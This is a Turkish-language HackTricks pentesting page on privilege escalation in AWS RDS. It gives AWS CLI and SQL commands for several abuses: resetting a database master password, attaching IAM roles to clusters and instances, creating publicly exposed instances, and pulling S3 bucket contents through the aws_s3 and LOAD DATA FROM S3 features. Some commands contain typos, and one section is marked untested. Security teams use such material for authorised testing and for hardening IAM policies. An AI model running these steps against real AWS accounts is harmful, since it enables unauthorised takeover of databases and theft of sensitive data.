# AWS - RDS Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## RDS - İlişkisel Veritabanı Servisi

RDS hakkında daha fazla bilgi için bakınız:

{{#ref}}
../../aws-services/aws-relational-database-rds-enum.md
{{#endref}}

### `rds:ModifyDBInstance`

Bu izinle bir saldırgan **master kullanıcının parolasını değiştirebilir**, ve veritabanı içindeki login bilgisini değiştirebilir:
```bash
# Get the DB username, db name and address
aws rds describe-db-instances

# Modify the password and wait a couple of minutes
aws rds modify-db-instance \
--db-instance-identifier <db-id> \
--master-user-password 'Llaody2f6.123' \
--apply-immediately

# In case of postgres
psql postgresql://<username>:<pass>@<rds-dns>:5432/<db-name>
```
> [!WARNING]
> Veritabanına **bağlanabilmeniz** gerekecek (genellikle yalnızca ağ içinden erişilebilirler).

**Olası Etki:** Veritabanları içinde hassas bilgilerin bulunması.

### rds-db:connect

According to the [**docs**](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.IAMDBAuth.IAMPolicy.html) bu izne sahip bir kullanıcı DB örneğine bağlanabilir.

### Abuse RDS Role IAM permissions

#### Postgresql (Aurora)

> [!TIP]
> Eğer **`SELECT datname FROM pg_database;`** çalıştırdığınızda **`rdsadmin`** adlı bir veritabanı bulursanız, AWS postgresql veritabanının içinde olduğunuzu anlarsınız.

İlk olarak bu veritabanının herhangi bir diğer AWS hizmetine erişmek için kullanılıp kullanılmadığını kontrol edebilirsiniz. Bunu kurulu eklentilere bakarak kontrol edebilirsiniz:
```sql
SELECT * FROM pg_extension;
```
Eğer **`aws_s3`** gibi bir şey bulursanız, bu veritabanının **S3 üzerinde bir tür erişimi** olduğu varsayılabilir (başka eklentiler de vardır, örn. **`aws_ml`** ve **`aws_lambda`**).

Ayrıca, eğer **`aws rds describe-db-clusters`** komutunu çalıştırma izniniz varsa, orada **`AssociatedRoles`** alanında **cluster'ın herhangi bir IAM Role'a bağlı olup olmadığını** görebilirsiniz. Eğer bağlıysa, veritabanının **diğer AWS servislerine erişecek şekilde hazırlandığını** varsayabilirsiniz. Rolün **adına** göre (veya rolün **izinlerini** elde edebilirseniz) veritabanının hangi ek erişimlere sahip olduğunu **tahmin edebilirsiniz**.

Şimdi, bir bucket içindeki bir dosyayı okumak için tam yolu bilmeniz gerekir. Şunu kullanarak okuyabilirsiniz:
```sql
// Create table
CREATE TABLE ttemp (col TEXT);

// Create s3 uri
SELECT aws_commons.create_s3_uri(
'test1234567890678', // Name of the bucket
'data.csv',          // Name of the file
'eu-west-1'          //region of the bucket
) AS s3_uri \gset

// Load file contents in table
SELECT aws_s3.table_import_from_s3('ttemp', '', '(format text)',:'s3_uri');

// Get info
SELECT * from ttemp;

// Delete table
DROP TABLE ttemp;
```
Eğer **raw AWS credentials**'e sahip olsaydınız, onları S3 verilerine erişmek için şu şekilde kullanabilirsiniz:
```sql
SELECT aws_s3.table_import_from_s3(
't', '', '(format csv)',
:'s3_uri',
aws_commons.create_aws_credentials('sample_access_key', 'sample_secret_key', '')
);
```
> [!NOTE]
> Postgresql **S3'e erişebilmek için herhangi bir parameter group variable değiştirmesine gerek yoktur.**

#### Mysql (Aurora)

> [!TIP]
> Bir mysql içinde, **`SELECT User, Host FROM mysql.user;`** sorgusunu çalıştırırsanız ve **`rdsadmin`** adlı bir kullanıcı varsa, içinde bulunduğunuzun **AWS RDS mysql db** olduğunu varsayabilirsiniz.

mysql içinde **`show variables;`** çalıştırın ve **`aws_default_s3_role`**, **`aurora_load_from_s3_role`**, **`aurora_select_into_s3_role`** gibi değişkenlerin değerleri varsa, veritabanının S3 verilerine erişmeye hazır olduğunu varsayabilirsiniz.

Ayrıca, **`aws rds describe-db-clusters`** komutunu çalıştırma izniniz varsa, cluster'ın herhangi bir **ilişkili role**'ü olup olmadığını kontrol edebilirsiniz; bu genellikle AWS hizmetlerine erişim anlamına gelir).

Şimdi, **bir bucket içindeki bir dosyayı okumak** için tam yolu bilmeniz gerekir. Şu komutla okuyabilirsiniz:
```sql
CREATE TABLE ttemp (col TEXT);
LOAD DATA FROM S3 's3://mybucket/data.txt' INTO TABLE ttemp(col);
SELECT * FROM ttemp;
DROP TABLE ttemp;
```
### `rds:AddRoleToDBCluster`, `iam:PassRole`

`rds:AddRoleToDBCluster` ve `iam:PassRole` izinlerine sahip bir saldırgan, mevcut bir RDS instance'ına belirtilen bir rolü ekleyebilir. Bu, saldırganın **hassas verilere erişmesine** veya örnek içindeki verileri değiştirmesine izin verebilir.
```bash
aws add-role-to-db-cluster --db-cluster-identifier <value> --role-arn <value>
```
**Potansiyel Etki**: RDS instance'ındaki hassas verilere erişim veya verilere yetkisiz değişiklikler.\
Bazı DB'lerin Mysql gibi ek yapılandırmalar gerektirdiğini unutmayın; örneğin Mysql, role ARN'nin parameter groups içinde de belirtilmesi gerekir.

### `rds:CreateDBInstance`

Sadece bu izinle bir saldırgan, zaten var olan ve bir **IAM role** bağlı bir **cluster içinde yeni bir instance** oluşturabilir. Master kullanıcı parolasını değiştiremeyecek, ancak yeni veritabanı instance'ını internete açabilir:
```bash
aws --region eu-west-1 --profile none-priv rds create-db-instance \
--db-instance-identifier mydbinstance2 \
--db-instance-class db.t3.medium \
--engine aurora-postgresql \
--db-cluster-identifier database-1 \
--db-security-groups "string" \
--publicly-accessible
```
### `rds:CreateDBInstance`, `iam:PassRole`

> [!NOTE]
> YAPILACAK: Test

Bir saldırgan `rds:CreateDBInstance` ve `iam:PassRole` izinlerine sahipse **belirtilen bir rol iliştirilmiş yeni bir RDS instance'ı oluşturabilir**. Saldırgan daha sonra potansiyel olarak **hassas verilere erişebilir** veya instance içindeki verileri değiştirebilir.

> [!WARNING]
> Eklenecek role/instance-profile için bazı gereksinimler (from [**here**](https://docs.aws.amazon.com/cli/latest/reference/rds/create-db-instance.html)):

> - Profil hesabınızda mevcut olmalıdır.
> - Profil, Amazon EC2'nin üstlenme iznine sahip bir IAM role sahip olmalıdır.
> - Instance profile adı ve ilişkili IAM rol adı `AWSRDSCustom` öneki ile başlamalıdır.
```bash
aws rds create-db-instance --db-instance-identifier malicious-instance --db-instance-class db.t2.micro --engine mysql --allocated-storage 20 --master-username admin --master-user-password mypassword --db-name mydatabase --vapc-security-group-ids sg-12345678 --db-subnet-group-name mydbsubnetgroup --enable-iam-database-authentication --custom-iam-instance-profile arn:aws:iam::123456789012:role/MyRDSEnabledRole
```
**Potential Impact**: RDS instance içindeki hassas verilere erişim veya verilerde yetkisiz değişiklikler.

### `rds:AddRoleToDBInstance`, `iam:PassRole`

`rds:AddRoleToDBInstance` ve `iam:PassRole` izinlerine sahip bir saldırgan, **var olan bir RDS instance'a belirtilen bir role ekleyebilir**. Bu, saldırganın **hassas verilere erişmesine** veya RDS instance içindeki verileri değiştirmesine olanak sağlayabilir.

> [!WARNING]
> Bu işlem için DB instance bir cluster'ın dışında olmalıdır
```bash
aws rds add-role-to-db-instance --db-instance-identifier target-instance --role-arn arn:aws:iam::123456789012:role/MyRDSEnabledRole --feature-name <feat-name>
```
**Olası Etki**: RDS instance içindeki hassas verilere erişim veya verilere yetkisiz değişiklikler.

{{#include ../../../../banners/hacktricks-training.md}}
